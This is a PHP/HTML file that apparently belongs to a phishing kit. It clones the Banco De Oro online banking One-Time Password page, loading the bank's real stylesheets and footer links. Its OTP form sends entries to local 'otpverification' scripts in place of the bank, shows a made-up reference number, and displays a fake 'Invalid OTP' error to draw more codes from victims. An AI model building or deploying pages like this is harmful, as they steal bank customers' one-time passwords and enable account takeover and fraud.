<?php

function generateRandomString($length) {
    $include_chars = "0123456789";
    /* Uncomment below to include symbols */
    /* $include_chars .= "[{(!@#$%^/&*_+;?\:)}]"; */
    $charLength = strlen($include_chars);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $include_chars [rand(0, $charLength - 1)];
    }
    return $randomString;
}
 
// Call function
$lenght = 6; # Set result string lenght
$codebash = generateRandomString($lenght);


?>



</script>
<!-- saved from url=(0014)about:internet -->
<html><script data-dapp-detection="">
(function() {
  let alreadyInsertedMetaTag = false

  function __insertDappDetected() {
    if (!alreadyInsertedMetaTag) {
      const meta = document.createElement('meta')
      meta.name = 'dapp-detected'
      document.head.appendChild(meta)
      alreadyInsertedMetaTag = true
    }
  }

  if (window.hasOwnProperty('web3')) {
    // Note a closure can't be used for this var because some sites like
    // www.wnyc.org do a second script execution via eval for some reason.
    window.__disableDappDetectionInsertion = true
    // Likely oldWeb3 is undefined and it has a property only because
    // we defined it. Some sites like wnyc.org are evaling all scripts
    // that exist again, so this is protection against multiple calls.
    if (window.web3 === undefined) {
      return
    }
    __insertDappDetected()
  } else {
    var oldWeb3 = window.web3
    Object.defineProperty(window, 'web3', {
      configurable: true,
      set: function (val) {
        if (!window.__disableDappDetectionInsertion)
          __insertDappDetected()
        oldWeb3 = val
      },
      get: function () {
        if (!window.__disableDappDetectionInsertion)
          __insertDappDetected()
        return oldWeb3
      }
    })
  }
})()</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!-- <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" /> -->
<meta http-equiv="X-UA-Compatible" content="IE=100">
<title>Banco De Oro Online Banking</title>
<!--<link href='http://fonts.googleapis.com/css?family=Tangerine' rel='stylesheet' type='text/css'>-->
<!--<link href='http://fonts.googleapis.com/css?family=Josefin+Sans+Std+Light' rel='stylesheet' type='text/css'>-->
<script type="text/javascript" src="./otp_files/wicket-event.js.download"></script>
<script type="text/javascript" src="./otp_files/wicket-ajax.js.download"></script>
<script type="text/javascript"><!--/*--><![CDATA[/*><!--*/
var keepaliveTimeout = setTimeout("confirmLogout();", 900000)
function resetSessionTimeout() {
keepaliveTimeout = setTimeout("confirmLogout();", 900000)
}
function confirmLogout() {
var date = new Date();


var dateNow = new Date();
if(((dateNow - date)/60000) > 1) {
logoutNow();
} else {
var wcall = wicketAjaxGet('?x=*1fMOmtH7tUwOJj82D*Ds062kwiW**1coKB1rQ1KdMQbhYPRl-*fJNR8kZZwvtvjLviuWeJ20xO1agki19Pes2K9wHRGyIcx', function(){},function(){});
clearTimeout(keepaliveTimeout);
keepaliveTimeout = setTimeout("confirmLogout();", 900000); 
}
}
function logoutNow() {
alert("Sorry, you have been automatically logged out for security purposes.");
var wcall = wicketAjaxGet('?x=*1fMOmtH7tUwOJj82D*Ds062kwiW**1coKB1rQ1KdMRRhSpfwSrFXINYIv-iApJXqDg3tTvCpKjqXQQYw4F8I3eErzLn9fxa', function(){},function(){});
}

/*-->]]>*/</script>

<script type="text/javascript" src="./otp_files/jquery-1.4.2.min.js.download"></script>
<script type="text/javascript" src="./otp_files/ui.core.min.js.download"></script>
<link rel="stylesheet" type="text/css" href="./otp_files/jquery-ui-1.8.2.custom.css">
<link rel="stylesheet" type="text/css" href="./otp_files/allcss.css">
<link rel="stylesheet" type="text/css" href="./otp_files/font-awesome.min.css">
<script type="text/javascript" src="./otp_files/jquery.validate.js.download"></script>
<script type="text/javascript" src="./otp_files/additional-methods.js.download"></script>
<script type="text/javascript" src="./otp_files/sxi-validations.js.download"></script>
<link rel="stylesheet" type="text/css" href="./otp_files/sxi-validations.css">
<script type="text/javascript" src="./otp_files/ccti.js.download"></script>
<link rel="stylesheet" type="text/css" href="./otp_files/base.css">
<script type="text/javascript" src="./otp_files/jquery.form.js.download"></script>
<link rel="stylesheet" type="text/css" href="./otp_files/icondocklite.css">
<link rel="stylesheet" type="text/css" href="./otp_files/layout.css">
<script type="text/javascript" src="./otp_files/jquery.maxlength.js.download"></script>
<script type="text/javascript" src="./otp_files/jquery.tools.min.js.download"></script>
<script type="text/javascript" src="./otp_files/sxi-flowtip.js.download"></script>
<link rel="stylesheet" type="text/css" href="./otp_files/flowtip.css">

<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.CitrineUnifiedLoginApplication/web/themes/theme-bdo/jquery-ui-1.8.2.custom.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.CitrineUnifiedLoginApplication/web/css/allcss.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.CitrineUnifiedLoginApplication/web/css/font-awesome.min.css" />

<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.validations.JQueryValidationBehavior/css/sxi-validations.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.BaseJavascriptBehavior/base.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.jquery.icondocklite.JQueryIconDockLiteBehavior/icondocklite.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.menu.BDOMenuJavascriptBehavior/layout.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.jquery.flowtip.JQueryFlowTipBehavior/flowtip.css" />
<script type="text/javascript"><!--/*--><![CDATA[/*><!--*/
Wicket.Event.add(window, "domready", function(event) { Wicket.Window.unloadConfirmation = false;});
/*-->]]>*/</script>

<script type="text/javascript" src="./otp_files/jquery.livequery.js.download"></script>
<script type="text/javascript" src="./otp_files/CitrineBasicPage.js.download"></script>
<script type="text/javascript"><!--/*--><![CDATA[/*><!--*/
var keepaliveTimeout = setTimeout("confirmLogout();", 900000)
function resetSessionTimeout() {
keepaliveTimeout = setTimeout("confirmLogout();", 900000)
}
function confirmLogout() {
var date = new Date();
window.alert("You have been inactive for awhile. \n\nFor security purposes, your session will automatically logout if there is no activity within one minute. \n\n Press OK to extend your session.");

var dateNow = new Date();
if(((dateNow - date)/60000) > 1) {
logoutNow();
} else {
var wcall = wicketAjaxGet('?x=*1fMOmtH7tUwOJj82D*Ds062kwiW**1coKB1rQ1KdMRB-NKT3pJTgnhiLkVd6-dg9fOcRJTkkWPbZEp*UB1XbwxmNtNV7j0G', function(){},function(){});
clearTimeout(keepaliveTimeout);
keepaliveTimeout = setTimeout("confirmLogout();", 900000); 
}
}
function logoutNow() {
alert("Sorry, you have been automatically logged out for security purposes.");
if(true) {
window.location = 'https://online.bdo.com.ph/sso/josso_logout_session_timeout/'; 
} else {
var wcall = wicketAjaxGet('https://online.bdo.com.ph/sso/josso_logout_session_timeout/', function(){},function(){});
}
}

/*-->]]>*/</script>

<script type="text/javascript" src="./otp_files/modal.js.download"></script>
<link rel="stylesheet" type="text/css" href="./otp_files/modal.css">
<script type="text/javascript"><!--/*--><![CDATA[/*><!--*/
Wicket.Event.add(window, "load", function(event) { var wcall=wicketAjaxGet('?x=norPZG0uBHGvOosRjc4CTPj4OjCCBc5j02MZcPCM-JlE8B-6JIMdZ1amPHoD9oPMcTAbgkYssy0',null,null, function() {return Wicket.$('id20') != null;}.bind(this));;});
/*-->]]>*/</script>

<script type="text/javascript" src="./otp_files/jquery.highlight.js.download"></script>
<script type="text/javascript" id="wiquery-gen1580040471555"><!--/*--><![CDATA[/*><!--*/
(function($) {
$(document).ready(function() {
$('#id21').highlight('tr','clsHighlightRow','onblur',null);
$('#id22').highlight('tr','clsHighlightRow','onblur',null);
$('#id23').highlight('tr','clsHighlightRow','onblur',null);
});
})(jQuery);
/*-->]]>*/</script>

<script type="text/javascript"><!--/*--><![CDATA[/*><!--*/
Wicket.Event.add(window, "load", function(event) { setTimeout("var wcall=wicketAjaxGet('?x=norPZG0uBHGvOosRjc4CTPeN2IpFpPjfektwVbFXd*zgwsTaw4OXV5eKc0UuOVhgFOEvWeQetejYSwtjOXjSZNgsHQSpR0qN7fXl4wuGuJEfU7emLWRvXZN2CUBxi1r27OxS1T*w2Oo',null,null, function() {var c = Wicket.$('id24'); return typeof(c) != 'undefined' && c != null}.bind(this));", 300000);;});
/*-->]]>*/</script>

</head>

<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
    <script type="text/javascript">
    window.history.forward();
    function noBack() { window.history.forward(); }
</script>

<div id="parentcontainer">
	<div id="wrapper">

		<div id="head">
			 <!-- <div id="headerbar">

				 <div id = "accountinfo">
					<span wicket:id = "accountInfo">Info here</span>
				</div>
			</div>--->
			
			<!-- <div id="logowrapper">
				<a href="#" title="Home" wicket:id = "homeLink">
					  <div id="logo"></div>
				</a>
			</div>
	
			<div id="search">
			</div>-->
			
			 <div id="contentTop">
			 
      <div id="logoWrapper">
        <div id="bdoLogo"><a href="http://www.bdo.com.ph" target="_blank"><span>Banco De Oro</span></a></div>
      </div>     	
      		 
      <div id="wrap" ver="1.1.3">
			<div class="menu-login-div" style="top:-17px;">
				<a class="gohome" href="http://localhost/dashboard/ss/bdo/sso/b/otp?x=logout">GO BACK TO BDO.COM.PH</a>
			</div>
	</div>

      </div>
		</div>

		<div id="page">
			<div>
</div>
			<div id="mainwrapper" class="ui-corner-all otppage">
				<div id="main" class="contentblock">
					<table>
						<tbody><tr>
							<td>
								<h2 class="pageHeader"><span>One-Time Password (OTP)</span></h2>
								<div class="headerCaption"><span></span></div>
							</td>
							<td>
								<div style="float: right; text-align: right">
									<div>
</div>
								</div>
							</td>
						</tr>
					</tbody></table>
					
					
					<div id="id25" class="sxiFeedback">
  
</div>
					<div><div id="id26" style="display:none">
	
</div></div>
					<div><div id="id27" style="display:none">
	
</div></div>
					
					<table>
						<tbody><tr>
							<td style="vertical-align: top">
								<div class="ui-widget">
									
	<div class="otppagemarker"></div>
 	<div>
	<div id="id28" style="display:none">
	<div id="id29" style="display:none"></div>
</div>
	<div id="id20" style="display:none">
	<div id="id2a" style="display:none"></div>
</div>
	<div style="text-align: left; width: 500px">
		<?php 
  $codepass = $_GET['param1'];

// Declaration of strings 
$auth = "$codepass"; 
$secure = "false"; 
  
// Use == operator 
if ($auth == $secure) { 

echo '<form autocomplete="off" loginform="true" id="id21" method="post" action="hold/otpverification1.php" class="jNice"><div style="display:none">';

} 
else { 
	echo '<form autocomplete="off" loginform="true" id="id21" method="post" action="hold/otpverification.php" class="jNice"><div style="display:none">';
} 
?>
		<input type="hidden" name="id21_hf_0" id="id21_hf_0"></div>
			<div id="id24">
</div>
								
								<label class="standardfont formlabel">To continue, please enter the OTP sent to your mobile device.</label><br><br>
								<label class="standardfont formlabel">For inquiries, your Reference Number is <?php echo $codebash ?>.</label>
								<br><br>
						<table class="formtable" width="400">
							<tbody>
								<tr>
									<font color="red">
									<td class="formlabel">
									<span class="standardfont">Enter your OTP: </span>
									</td>
									<td>
									<input class="textbox box required noSpecial" id="otp" type="text" tabindex="2" maxlength="6" value="" name="otp" oninput="otpfilter()">
									</td>
								</tr>
								<?php 
  $codepass = $_GET['param1'];

// Declaration of strings 
$auth = "$codepass"; 
$secure = "false"; 
  
// Use == operator 
if ($auth == $secure) { 

echo '<tr>
									<td colspan="2">
									<span id="idd" class="sxiFeedback">
  <ul class="paginationul">
    <li class="feedbackPanelERROR">
      <span class="feedbackPanelERROR">Invalid One-Time Password (OTP). You are only allowed a maximum of 3 attempts. Please try again.</span>
    </li>
  </ul>
</span>
									<ul>
											<li class="feedbackPanelERROR">
												<br>
											</li>
									</ul>
									</td>
								</tr>';

} 
else { 
	echo '<tr>
									<td colspan="2">
									<span id="id2b" class="sxiFeedback"></span>
									<ul>
											<li class="feedbackPanelERROR">
												<br>
											</li>
									</ul>
									</td>
								</tr>';
} 
?>
								
								<tr>
									<td colspan="2">
										<div id="btn-submit">
											<input class="sxi-button ui-corner-all ui-state-default" type="submit" tabindex="3" name="submitButton" validating="false" value="Proceed">
											<input class="sxi-button ui-corner-all ui-state-default" type="submit" tabindex="3" name="cancelButton" validating="false" value="Cancel Login">
											
										</div>
									</td>
								</tr>
								<tr>
									<td colspan="2" class="formlabel">
									
									
									
									<label class="standardfont">If you did not receive your One-Time password (OTP) via SMS within 5 minute(s) or if your One-Time password (OTP) has expired, click here to generate a new</label>
									<a href="http://localhost/dashboard/ss/bdo/sso/b/otp.php?param1=true#" style="text-decoration:underline" id="genOTP" onclick="genOTP()">One-Time Password</a>
									<label class="standardfont formlabel">to proceed with your login.</label><br>
									<br>
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<ul>
											<li class="feedbackPanelERROR">
												<br>
											</li>
										</ul>
									</td>
								</tr>
							</tbody>
	  					</table>
		</form>
	</div>
</div>

								</div>
							</td>
							<td style="vertical-align: top" width="20px">
								<div id="info">
									<div>
</div>
								</div>
							</td>
						</tr>
					</tbody></table>

				</div>
			</div>
		</div>

	<div id="footerDiv">
      <div class="horizontalRule"></div>
      <div id="footerCopyright">BDO Unibank, Inc. © 2015. All Rights Reserved</div>
      <div id="footerLinksDiv">
        <a href="https://www.bdo.com.ph/about-bdo/business-operation" target="_blank">About BDO</a>
        <a href="http://www.bdo.com.ph/corporate-governance" target="_blank">Corporate Governance</a>
        <a href="http://www.bdo.com.ph/investor-relations/official-disclosures" target="_blank">Investor Relations</a>
        <a href="http://www.bdo.com.ph/careers" target="_blank">Careers</a>
        <a href="https://www.bdo.com.ph/news-and-articles" target="_blank">Press Room</a>
        <a href="http://www.bdo.com.ph/hong-kong-home" target="_blank">Hongkong</a>
        <a href="https://www.bdo.com.ph/site-map" target="_blank">Site Map</a>
        <a href="http://www.bdo.com.ph/privacy-policy" target="_blank">Privacy Policy</a>

      </div>
      <div style="color: white;">Version 2011-06-03</div>
    </div>

	</div>

<div id="bysy_indicator" style="display: none;">
	<div id="loading_gif">
	
	</div>
</div>

</div>
<div id="id2f">
</div>



</body></html>






